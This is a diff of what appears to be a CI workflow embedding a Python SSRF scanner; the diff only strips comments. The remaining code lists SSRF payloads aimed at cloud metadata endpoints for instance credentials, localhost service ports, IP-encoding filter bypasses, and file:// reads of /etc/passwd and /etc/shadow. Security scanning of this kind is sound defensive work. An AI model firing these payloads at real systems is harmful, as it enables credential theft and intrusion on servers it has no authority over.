@@ -43,7 +43,6 @@ jobs:
 
         print(f"=== SSRF SCAN: {target_url} ===\n")
 
-        # Parse URL to find parameter
         parsed = urllib.parse.urlparse(target_url)
         params = urllib.parse.parse_qs(parsed.query)
 
@@ -55,30 +54,25 @@ jobs:
         findings = []
         base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
 
-        # SSRF payloads
         payloads = {
-            # Cloud metadata
             'aws_metadata': 'http://169.254.169.254/latest/meta-data/',
             'aws_metadata_v2': 'http://169.254.169.254/latest/api/token',
             'gcp_metadata': 'http://metadata.google.internal/computeMetadata/v1/',
             'azure_metadata': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
 
-            # Internal networks
             'localhost_80': 'http://127.0.0.1:80',
             'localhost_22': 'http://127.0.0.1:22',
             'localhost_3306': 'http://127.0.0.1:3306',
             'localhost_6379': 'http://127.0.0.1:6379',
             'localhost_8080': 'http://127.0.0.1:8080',
 
-            # Bypass techniques
-            'decimal_ip': 'http://2130706433/',  # 127.0.0.1
+            'decimal_ip': 'http://2130706433/',
             'hex_ip': 'http://0x7f000001/',
             'octal_ip': 'http://0177.0.0.1/',
             'ipv6_localhost': 'http://[::1]/',
             'short_url': 'http://0/',
             'redirect_localhost': 'http://localtest.me/',
 
-            # File protocol
             'file_passwd': 'file:///etc/passwd',
             'file_hosts': 'file:///etc/hosts',
             'file_shadow': 'file:///etc/shadow',
@@ -104,7 +98,6 @@ jobs:
                     body = resp.read().decode('utf-8', errors='replace')[:2000]
                     status = resp.status
 
-                    # Check for indicators
                     indicators = {
                         'aws_metadata': ['ami-id', 'instance-id', 'security-credentials', 'iam'],
                         'gcp_metadata': ['project', 'instance', 'attributes'],
@@ -126,7 +119,6 @@ jobs:
                                     break
 
                     if not matched and status == 200 and len(body) > 50:
-                        # Check response differs from baseline
                         if payload_name.startswith('localhost'):
                             findings.append(f'[MEDIUM] {payload_name}: Got {status} with {len(body)} bytes')
                             print(f"  [?] {payload_name}: {status} ({len(body)} bytes)")
